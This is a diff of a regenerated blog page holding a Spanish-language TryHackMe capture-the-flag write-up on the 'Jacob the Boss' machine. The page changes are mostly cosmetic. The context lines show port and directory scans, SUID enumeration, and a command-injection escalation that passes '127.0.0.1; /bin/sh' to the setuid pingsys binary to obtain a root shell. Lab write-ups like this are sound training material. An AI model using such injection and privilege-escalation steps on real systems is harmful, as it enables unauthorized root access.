@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Jacob the Boss es una maquina de TryHackMe, la version de JBossWS es vulnerable por lo que utilizamos JexBoss Tool para ejecutar una shell inversa. Finalmente escalamos privilegios con un fichero SUID.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.92.2" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1603,13 +1603,13 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/suid/" class="single__tag" title="suid">suid</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/jboss/" class="single__tag" title="jboss">jboss</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/jexboss-tool/" class="single__tag" title="jexboss tool">jexboss tool</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/suid/" class="single__tag" title="suid">suid</a></li>
   
 
 </ul>
@@ -1660,7 +1660,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80), mysql (3306), apache tomcat (8080) y el servicio jboss (8083) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1703,7 +1703,7 @@
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Tue Sep  8 17:24:17 2020 as: nmap -sV -o mini_scan jacobtheboss.box</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Tue Sep  8 17:24:17 2020 as: nmap -sV -o mini_scan jacobtheboss.box</span>
 Nmap scan report <span class="k">for</span> jacobtheboss.box <span class="o">(</span>10.10.186.254<span class="o">)</span>
 Host is up <span class="o">(</span>0.28s latency<span class="o">)</span>.
 Not shown: <span class="m">987</span> closed ports
@@ -1749,11 +1749,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80.</p>
 <p><img src="/images/posts/thm/jacobtheboss/Screenshot_20200908_153111.png" alt="image" /></p>
-<h2 id="gobuster-">GOBUSTER</h2>
+<h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1769,7 +1769,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/jacobtheboss$ gobuster dir -u http://jacobtheboss.box/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/jacobtheboss$ gobuster dir -u http://jacobtheboss.box/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
 /admin <span class="o">(</span>Status: 301<span class="o">)</span>
 /cache <span class="o">(</span>Status: 403<span class="o">)</span>
 /cgi-bin/ <span class="o">(</span>Status: 403<span class="o">)</span>
@@ -1789,11 +1789,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>RCP solo nos muestra que la conexion ha sido rechazada sin las credenciales.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/jacobtheboss$ rpcclient -U <span class="s1">&#39;&#39;</span> -N jacobtheboss.box
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/jacobtheboss$ rpcclient -U <span class="s1">&#39;&#39;</span> -N jacobtheboss.box
 Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED
 </code></pre></td></tr></table>
 </div>
@@ -1814,7 +1814,7 @@ Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED
 <p>Hacemos una pequeña enumeracion en busqueda de archivos <code>SUID</code> y vemos varios comandos/binarios, a un principio se veia prometedor <code>crontab</code> pero al ejecutar <code>crontab -e</code> lo cual nos permitiria crear un cron como usuario root no era suficiente la shell que teniamos. Vemos tambien <code>pingsys</code> el cual realiza un ping a una determinada IP.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1838,7 +1838,7 @@ Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>jacob@jacobtheboss /<span class="o">]</span>$ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>jacob@jacobtheboss /<span class="o">]</span>$ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
 find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
 -rwsr-xr-x. <span class="m">1</span> root root  73K Aug  <span class="m">9</span>  <span class="m">2019</span> /usr/bin/chage
 -rws--x--x. <span class="m">1</span> root root  24K Apr  <span class="m">1</span> 04:51 /usr/bin/chfn
@@ -1865,7 +1865,7 @@ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
 </div><p>Despues de investigar un poco sobre <code>pingsys</code> encontramos un <a href="https://security.stackexchange.com/a/196580"><strong>post en donde habla acerca de este binario</strong></a>, el codigo fuente y de cómo es posible obtener una shell con privilegios root. El Binario que encontramos en la maquina tiene strings muy parecidas al del codigo del post.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1887,7 +1887,7 @@ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>jacob@jacobtheboss /<span class="o">]</span>$ file /usr/bin/pingsys
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>jacob@jacobtheboss /<span class="o">]</span>$ file /usr/bin/pingsys
 /usr/bin/pingsys: setuid ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>6edc93ec3e4b82857772727e602265140ee00823, not stripped
 <span class="o">[</span>jacob@jacobtheboss /<span class="o">]</span>$ strings /usr/bin/pingsys
 /lib64/ld-linux-x86-64.so.2
@@ -1906,16 +1906,16 @@ wrr~<span class="sb">`</span><span class="s2">&#34;e
 </span><span class="s2">setUID ERROR
 </span><span class="s2">;*3</span>$<span class="s2">&#34;</span>
 <span class="o">[</span>... REDACTED ...<span class="o">]</span>
-<span class="o">[</span>root@jacobtheboss .ssh<span class="o">]</span>#
+<span class="o">[</span>root@jacobtheboss .ssh<span class="o">]</span><span class="c1">#</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Utilizamos <code>pingsys</code> pasandole una IP y <code>/bin/sh</code> separados por <code>;</code> lo cual va a realizar ping sobre la IP y luego ejecutará <code>/bin/sh</code>, logramos obtener una shell con usuario root y la flag <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/pingsys <span class="s1">&#39;127.0.0.1; /bin/sh&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/pingsys <span class="s1">&#39;127.0.0.1; /bin/sh&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/jacobtheboss/Screenshot_20200908_170203.png" alt="image" /></p>
@@ -2210,7 +2210,7 @@ wrr~<span class="sb">`</span><span class="s2">&#34;e
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3327,7 +3327,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#nmap">NMAP</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#gobuster">GOBUSTER</a></li>
       </ul>
     </li>
     <li><a href="#rpcbind">RPCBIND</a></li>
